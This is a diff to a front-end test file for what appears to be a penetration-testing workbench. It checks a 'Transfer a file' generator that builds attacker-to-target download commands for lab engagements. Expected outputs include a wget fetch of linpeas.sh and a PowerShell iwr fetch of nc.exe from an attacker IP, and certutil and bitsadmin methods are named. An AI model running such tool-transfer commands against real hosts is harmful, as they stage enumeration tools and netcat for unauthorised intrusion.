@@ -1,5 +1,5 @@
 import { QueryClientProvider } from "@tanstack/react-query";
-import { render, screen, within } from "@testing-library/react";
+import { act, render, screen, within } from "@testing-library/react";
 import userEvent from "@testing-library/user-event";
 import { MemoryRouter } from "react-router";
 import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
@@ -10,6 +10,7 @@ import { useCaptureStore } from "../features/capture/useCaptureStore";
 import { useNotesStore } from "../features/notes/useNotesStore";
 import type { LogEntryInput } from "../types/log";
 import { usePaletteStore } from "../features/palette/usePaletteStore";
+import { usePayloadsStore } from "../features/payloads/usePayloadsStore";
 import { useLastEngagementStore } from "../features/arsenal/useFillScope";
 import { api } from "../lib/api";
 import { commandText } from "./support/commandText";
@@ -25,7 +26,7 @@ vi.mock("../features/checklist/ticks", async (orig) => ({
 const m = vi.mocked(api, true);
 
 const E1: Engagement = {
-  id: "e1", name: "Mock exam A", kind: "lab", client: null, subLabel: null, scopeCidrs: ["10.10.10.0/24"],
+  id: "e1", name: "Lab A", kind: "lab", client: null, subLabel: null, scopeCidrs: ["10.10.10.0/24"],
   domain: null, startsAt: null, endsAt: null, timeboxStart: null, timeboxMinutes: null, status: "active",
   createdAt: 1, updatedAt: 1, lastActivityAt: null, lastRanOn: null, msfHostId: null,
 };
@@ -63,6 +64,7 @@ beforeEach(() => {
   useLastEngagementStore.setState({ engagementId: "e1", hostId: "ms02" });
   useArsenalStore.setState({ open: false, cardId: null });
   useNotesStore.setState({ open: false });
+  usePayloadsStore.setState({ open: false, generator: "shell", overrides: {}, lhost: null });
   setImported({ commands: [], cards: [], toolkit: TOOLKIT });
   m.vaultStatus.mockResolvedValue({ exists: true, unlocked: true });
   m.settingsGet.mockResolvedValue({
@@ -93,7 +95,7 @@ const generator = async () => {
 describe("Transfer a file", () => {
   it("picking winPEASx64_ofs.exe for MS02 fills serve and fetch with LHOST, FILE and DEST_DIR", async () => {
     const user = userEvent.setup();
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "winPEASx64_ofs.exe");
     expect(g.getByText("1 · On Kali")).toBeInTheDocument();
@@ -119,7 +121,7 @@ describe("Transfer a file", () => {
       windowsToolsDir: "/opt/win tools", linuxToolsDir: "/opt/lin", fieldManualPath: "~/fm", nvdKeySet: false,
     });
     const user = userEvent.setup();
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "winPEASx64_ofs.exe");
     expect(await pre(g, "cd '/opt/win tools' && python3 -m http.server 80")).toBeInTheDocument();
@@ -127,7 +129,7 @@ describe("Transfer a file", () => {
 
   it("an unstaged tool shows where to get it", async () => {
     const user = userEvent.setup();
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     await user.click(await g.findByRole("combobox", { name: "Value for FILE" }));
     const list = await g.findByRole("listbox", { name: "Suggestions for FILE" });
@@ -142,20 +144,20 @@ describe("Transfer a file", () => {
     const certutil = getLibrary().find((c) => c.title === "Download with certutil" && c.cardId === "shell-file-transfer-to-windows")!;
     setImported({ commands: [{ ...certutil, exam: "banned" }], cards: [], toolkit: TOOLKIT });
     const user = userEvent.setup();
-    const { unmount } = mount("/arsenal?generator=transfer", EXAM);
+    const { unmount } = mount("/payloads?generator=transfer", EXAM);
     const g = within(await generator());
     expect(await g.findByRole("tab", { name: "bitsadmin" })).toBeInTheDocument();
     expect(g.queryByRole("tab", { name: "certutil" })).not.toBeInTheDocument();
     unmount();
     // In a lab the same method is offered.
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     expect(await within(await generator()).findByRole("tab", { name: "certutil" })).toBeInTheDocument();
     void user;
   });
 
   it("⌘↵ copies and logs the fetch against the host", async () => {
     const user = userEvent.setup();
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     await user.type(await g.findByRole("combobox", { name: "Value for FILE" }), "nc.exe");
     await user.keyboard("{Meta>}{Enter}{/Meta}");
@@ -166,7 +168,7 @@ describe("Transfer a file", () => {
     });
   });
 
-  it("the palette opens the generator in Arsenal", async () => {
+  it("the palette opens the generator in the Payloads drawer", async () => {
     const user = userEvent.setup();
     mount("/e/e1/h/ms02");
     await screen.findByRole("tab", { name: "Next" });
@@ -179,9 +181,66 @@ describe("Transfer a file", () => {
   });
 });
 
+describe("Transfer a file in Payloads: context and copy guard", () => {
+  const blankIp = () => m.settingsGet.mockResolvedValue({
+    autoLockMinutes: 30, backupRetention: 14, machines: ["Kali (VM)"], attackerIp: "", listenerPort: "4444", kaliUser: "kali",
+    windowsToolsDir: "~/tools/windows", linuxToolsDir: "~/tools/linux", fieldManualPath: "~/fm", nvdKeySet: false,
+  });
+
+  it("follows the Payloads OS override and the session LHOST, not the host's OS and Settings", async () => {
+    usePayloadsStore.setState({ overrides: { ms02: { os: "linux" } }, lhost: "192.0.2.77" });
+    const user = userEvent.setup();
+    mount("/payloads?generator=transfer");
+    const g = within(await generator());
+    await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "linpeas.sh");
+    expect(await pre(g, "wget http://192.0.2.77/linpeas.sh -O /tmp/linpeas.sh")).toBeInTheDocument();
+    expect(g.queryByRole("combobox", { name: "Target OS" })).not.toBeInTheDocument();
+  });
+
+  it("Workbench: ⌘↵ with a blank attacker IP copies and logs nothing and focuses LHOST; ⌘↵ again copies anyway", async () => {
+    blankIp();
+    const user = userEvent.setup();
+    mount("/payloads?generator=transfer");
+    const g = within(await generator());
+    await user.type(g.getByRole("combobox", { name: "Value for FILE" }), "nc.exe");
+    await navigator.clipboard.writeText("untouched");
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    expect(m.logCreate).not.toHaveBeenCalled();
+    expect(screen.getByRole("complementary", { name: "Raven's read" }).querySelector("input[aria-label='LHOST']")).toHaveFocus();
+    expect(g.getByText("{LHOST} not filled · ↵ again to copy anyway")).toBeInTheDocument();
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
+  });
+
+  it("drawer: the Transfer tab has its own LHOST field; a blank IP sends Copy and ⌘↵ there first", async () => {
+    blankIp();
+    const user = userEvent.setup();
+    mount("/e/e1/h/ms02");
+    await screen.findByRole("tab", { name: "Next" });
+    act(() => usePayloadsStore.getState().show("transfer"));
+    const d = within(await screen.findByRole("complementary", { name: "Payloads" }));
+    const g = within(await d.findByRole("region", { name: "Transfer a file" }));
+    await user.type(await g.findByRole("combobox", { name: "Value for FILE" }), "nc.exe");
+    await navigator.clipboard.writeText("untouched");
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    const lhost = d.getByRole("textbox", { name: "LHOST" });
+    expect(lhost).toHaveFocus();
+    // The target half's own Copy button goes through the same guard.
+    await user.click(g.getAllByRole("button", { name: /^Copy/ }).at(-1)!);
+    expect(await navigator.clipboard.readText()).toBe("untouched");
+    expect(lhost).toHaveFocus();
+    await user.type(lhost, "192.0.2.10");
+    await user.keyboard("{Meta>}{Enter}{/Meta}");
+    await vi.waitFor(() => expect(m.logCreate).toHaveBeenCalled());
+    expect(await navigator.clipboard.readText()).toBe("iwr -Uri http://192.0.2.10/nc.exe -OutFile C:\\Windows\\Temp\\nc.exe -UseBasicParsing");
+  });
+});
+
 describe("Transfer a file: layout", () => {
-  it("has no host control of its own: the browse chip is the one source", async () => {
-    mount("/arsenal?generator=transfer");
+  it("has no host control of its own: the Workbench chip is the one source", async () => {
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     expect(g.queryByRole("combobox", { name: "To host" })).not.toBeInTheDocument();
     expect(screen.getAllByRole("button", { name: /^Fill for host/ })).toHaveLength(1);
@@ -189,7 +248,7 @@ describe("Transfer a file: layout", () => {
 
   it("footnote never reads 'the the'", async () => {
     useLastEngagementStore.setState({ engagementId: "e1", hostId: null });
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await screen.findByRole("region", { name: "Transfer a file" }));
     const note = await g.findByText(/copies the .* half/);
     expect(note.textContent).toMatch(/copies the target half/);
@@ -197,13 +256,13 @@ describe("Transfer a file: layout", () => {
   });
 
   it("with a host the footnote names it", async () => {
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     expect((await g.findByText(/copies the .* half/)).textContent).toMatch(/copies the MS02 half/);
   });
 
   it("method pills are grouped under HTTP and Other with about 6 per group (the Windows HTTP group has 7)", async () => {
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     await g.findAllByRole("tab");
     const groups = g.getAllByRole("tablist");
@@ -218,7 +277,7 @@ describe("Transfer a file: layout", () => {
 describe("Transfer a file: keyboard", () => {
   it("focuses the File field and keeps the method tabs to one Tab stop with arrow keys", async () => {
     const user = userEvent.setup();
-    mount("/arsenal?generator=transfer");
+    mount("/payloads?generator=transfer");
     const g = within(await generator());
     await vi.waitFor(() => expect(g.getByRole("combobox", { name: "Value for FILE" })).toHaveFocus());
     const tabs = g.getAllByRole("tab");
